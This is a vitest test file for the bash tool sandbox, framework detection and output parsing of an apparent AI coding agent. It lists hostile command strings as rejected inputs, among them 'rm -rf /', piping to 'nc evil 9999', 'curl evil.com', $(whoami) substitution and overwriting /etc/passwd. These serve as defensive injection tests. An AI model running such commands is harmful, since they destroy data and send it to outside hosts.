import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { randomUUID } from 'node:crypto'
import type Database from 'better-sqlite3'
import { openDatabase } from '../data/connection.js'
import { InMemoryKeystore } from '../electron/secrets/keystore.js'
import { bashTool } from './bash.js'
import { detectFramework, parseTestCounts } from './runTestSuite.js'
import { ToolError, type ToolContext } from './ToolDef.js'
import type { RoleType } from '@core/types/role.js'

let workspaceRoot: string
let db: Database.Database
let dbDir: string
let keystore: InMemoryKeystore

function makeCtx(role: RoleType): ToolContext {
  return {
    workspace_id: randomUUID(),
    workspace_root: workspaceRoot,
    iteration_id: randomUUID(),
    role,
    abort_signal: new AbortController().signal,
    emit_event: () => {},
    db,
    keystore,
    read_files_in_iteration: new Set<string>(),
    iteration_number: 1,
  }
}

beforeEach(() => {
  workspaceRoot = mkdtempSync(join(tmpdir(), 'polycoder-exec-'))
  dbDir = mkdtempSync(join(tmpdir(), 'polycoder-exec-db-'))
  db = openDatabase(join(dbDir, 'test.db'))
  keystore = new InMemoryKeystore()
})

afterEach(() => {
  db.close()
  rmSync(workspaceRoot, { recursive: true, force: true })
  rmSync(dbDir, { recursive: true, force: true })
})

// ─── bash sandbox ───────────────────────────────────────────────────

describe('bashTool sandbox', () => {
  it('rejects commands not in the safe list', async () => {
    await expect(
      bashTool.call(
        { command: 'rm -rf /', timeout_ms: 5000, cwd_relative: '.' },
        makeCtx('test_runner'),
      ),
    ).rejects.toMatchObject({ code: 'sandbox_violation' })
  })

  it('rejects bash from any role other than test_runner via allowedRoles', () => {
    expect(bashTool.allowedRoles).toEqual(['test_runner'])
  })

  it('argv allowlist accepts the common test-runner invocations', async () => {
    // SAFE_COMMAND_PATTERNS was removed in the bash-sandbox RCE
    // hardening (commit WW). The new validator parses argv and
    // rejects anything outside EXECUTABLE_ALLOWLIST + test verb
    // constraints. These calls should all PARSE — they fail later
    // at spawn time if the binary isn't installed, but that's not
    // what this test exercises.
    const ok: string[] = [
      'pnpm test',
      'pnpm run test',
      'bun test src/x',
      'npx vitest run',
      'vitest run',
      'jest',
      'pytest tests/',
      'go test ./...',
    ]
    for (const cmd of ok) {
      try {
        await bashTool.call(
          { command: cmd, timeout_ms: 50, cwd_relative: '.' },
          makeCtx('test_runner'),
        )
      } catch (e) {
        // We accept ToolError from a non-existent binary, but NOT
        // a sandbox_violation — that would mean the validator wrongly
        // rejected the command shape.
        if (
          e &&
          typeof e === 'object' &&
          'code' in e &&
          (e as { code: string }).code === 'sandbox_violation'
        ) {
          throw new Error(`${cmd} wrongly rejected by sandbox`)
        }
      }
    }
  })

  it('argv validator rejects shell metacharacters', async () => {
    const evil = [
      'pnpm test; rm -rf /',
      'pnpm test && curl evil.com',
      'pnpm test | nc evil 9999',
      'pnpm test `whoami`',
      'pnpm test $(whoami)',
      'pnpm test\nrm -rf ~',
      'bash -c "rm -rf ~"',
      'pnpm test > /etc/passwd',
    ]
    for (const cmd of evil) {
      await expect(
        bashTool.call(
          { command: cmd, timeout_ms: 50, cwd_relative: '.' },
          makeCtx('test_runner'),
        ),
      ).rejects.toMatchObject({ code: 'sandbox_violation' })
    }
  })

  it('rejects cwd escaping the workspace', async () => {
    await expect(
      bashTool.call(
        { command: 'pnpm test', timeout_ms: 5000, cwd_relative: '../escape' },
        makeCtx('test_runner'),
      ),
    ).rejects.toBeInstanceOf(ToolError)
  })

  it('runs an allowed command (true exit 0)', async () => {
    // Use `vitest --version` as a no-op-ish allowed command;
    // we don't actually need a project to run it.
    // Skip if vitest isn't present.
    const out = await bashTool.call(
      { command: 'vitest --version', timeout_ms: 15000, cwd_relative: '.' },
      makeCtx('test_runner'),
    )
    expect(out.exit_code).toBe(0)
    expect(out.stdout.length).toBeGreaterThan(0)
  })
})

// ─── runTestSuite framework detection ───────────────────────────────

describe('detectFramework', () => {
  it('detects vitest from package.json scripts', () => {
    writeFileSync(
      join(workspaceRoot, 'package.json'),
      JSON.stringify({ scripts: { test: 'vitest run' } }),
    )
    expect(detectFramework(workspaceRoot)).toBe('vitest')
  })

  it('detects jest from package.json scripts', () => {
    writeFileSync(
      join(workspaceRoot, 'package.json'),
      JSON.stringify({ scripts: { test: 'jest --coverage' } }),
    )
    expect(detectFramework(workspaceRoot)).toBe('jest')
  })

  it('detects vitest from config file when no scripts', () => {
    writeFileSync(join(workspaceRoot, 'package.json'), JSON.stringify({}))
    writeFileSync(join(workspaceRoot, 'vitest.config.ts'), '// config')
    expect(detectFramework(workspaceRoot)).toBe('vitest')
  })

  it('detects pytest from pyproject.toml', () => {
    writeFileSync(join(workspaceRoot, 'pyproject.toml'), '[tool.pytest]\n')
    expect(detectFramework(workspaceRoot)).toBe('pytest')
  })

  it('detects go-test from go.mod', () => {
    writeFileSync(join(workspaceRoot, 'go.mod'), 'module x\n')
    expect(detectFramework(workspaceRoot)).toBe('go-test')
  })

  it('falls back to vitest when nothing matches', () => {
    expect(detectFramework(workspaceRoot)).toBe('vitest')
  })
})

// ─── runTestSuite output parsing ───────────────────────────────────

describe('parseTestCounts', () => {
  it('parses vitest summary line', () => {
    const out = ` Test Files  20 passed (20)\n      Tests  151 passed | 4 skipped (155)\n`
    const counts = parseTestCounts(out, 'vitest')
    expect(counts.passed).toBe(151)
    expect(counts.skipped).toBe(4)
  })

  it('parses pytest summary line', () => {
    const out = '===== 5 passed, 1 failed, 2 skipped in 3.21s =====\n'
    const counts = parseTestCounts(out, 'pytest')
    expect(counts.passed).toBe(5)
  })

  it('returns nulls when output is unparseable', () => {
    const counts = parseTestCounts('random text\n', 'vitest')
    // Vitest pattern requires "Tests" prefix; without it we get all-null
    // (or partial null — failed/skipped default to 0). Tolerate either.
    expect(counts.passed === null).toBe(true)
  })
})
